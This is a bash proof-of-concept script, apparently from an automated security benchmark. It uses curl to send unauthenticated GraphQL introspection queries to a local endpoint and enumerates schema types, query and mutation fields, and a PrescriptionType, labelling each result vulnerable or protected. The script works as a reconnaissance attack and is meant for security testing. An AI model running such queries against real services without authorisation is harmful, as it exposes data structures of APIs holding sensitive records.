#!/bin/bash
# POC: Demonstrates GraphQL schema introspection vulnerability by querying __schema and __type without authentication
# Target: ./repo
# Created: 2025-11-10T19:42:36.147Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL Schema Introspection POC
# This script demonstrates the ability to fully enumerate the GraphQL schema
# without authentication, revealing all types, queries, mutations, and fields

TARGET="${1:-http://localhost:5003/graphql}"
RESULTS_FILE="introspection_results.txt"

echo "========================================"
echo "GraphQL Schema Introspection POC"
echo "========================================"
echo "Target: $TARGET"
echo ""

# Test 1: Basic schema introspection - get all type names
echo "[*] Test 1: Retrieving all schema types..."
RESPONSE1=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}')

if echo "$RESPONSE1" | grep -q '"name"'; then
  echo "[+] SUCCESS: Schema introspection query accepted (HTTP 200)"
  echo "[+] Response contains type information:"
  echo "$RESPONSE1" | grep -o '"name":"[^"]*"' | head -10
  RESULT1="VULNERABLE"
else
  echo "[-] Schema introspection query blocked or failed"
  RESULT1="PROTECTED"
fi
echo ""

# Test 2: Query type introspection - get Query fields and arguments
echo "[*] Test 2: Retrieving Query type fields and arguments..."
RESPONSE2=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name: \"Query\") { fields { name args { name type { name } } description } } }"}')

if echo "$RESPONSE2" | grep -q 'getPrescriptions'; then
  echo "[+] SUCCESS: Query introspection revealed getPrescriptions mutation"
  echo "[+] Full Query type structure:"
  echo "$RESPONSE2" | jq . 2>/dev/null || echo "$RESPONSE2"
  RESULT2="VULNERABLE"
else
  echo "[-] Query introspection blocked or returned empty"
  RESULT2="PROTECTED"
fi
echo ""

# Test 3: Type introspection - get specific type structure (PrescriptionType)
echo "[*] Test 3: Retrieving PrescriptionType structure..."
RESPONSE3=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name: \"PrescriptionType\") { fields { name type { name } description } } }"}')

if echo "$RESPONSE3" | grep -q '"name"'; then
  echo "[+] SUCCESS: Type introspection revealed PrescriptionType fields"
  echo "[+] Discovered fields:"
  echo "$RESPONSE3" | grep -o '"name":"[^"]*"' | grep -v '__'
  RESULT3="VULNERABLE"
else
  echo "[-] Type introspection blocked or type not found"
  RESULT3="PROTECTED"
fi
echo ""

# Test 4: Check for Mutation type
echo "[*] Test 4: Retrieving Mutation type fields..."
RESPONSE4=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name: \"Mutation\") { fields { name args { name type { name } } description } } }"}')

if echo "$RESPONSE4" | grep -q 'addPrescription'; then
  echo "[+] SUCCESS: Mutation introspection revealed addPrescription mutation"
  echo "[+] Mutations discovered:"
  echo "$RESPONSE4" | grep -o '"name":"[^"]*"' | head -10
  RESULT4="VULNERABLE"
else
  echo "[-] Mutation introspection blocked"
  RESULT4="PROTECTED"
fi
echo ""

# Test 5: Verify no authentication is required
echo "[*] Test 5: Verifying authentication is NOT required..."
RESPONSE5=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}' \
  -v 2>&1 | grep -E "HTTP/|WWW-Authenticate|Authorization")

if echo "$RESPONSE5" | grep -q "200"; then
  echo "[+] SUCCESS: Schema introspection works WITHOUT authentication headers"
  RESULT5="VULNERABLE"
else
  echo "[-] Authentication appears to be enforced"
  RESULT5="PROTECTED"
fi
echo ""

# Summary
echo "========================================"
echo "SUMMARY"
echo "========================================"
echo "Test 1 (Schema types): $RESULT1"
echo "Test 2 (Query fields): $RESULT2"
echo "Test 3 (Type fields): $RESULT3"
echo "Test 4 (Mutations): $RESULT4"
echo "Test 5 (No auth required): $RESULT5"
echo ""

# Overall verdict
if [[ "$RESULT1" == "VULNERABLE" || "$RESULT2" == "VULNERABLE" ]]; then
  echo "[!] VERDICT: GraphQL Schema Introspection is ENABLED and EXPLOITABLE"
  exit 0
else
  echo "[!] VERDICT: Schema introspection appears to be protected"
  exit 1
fi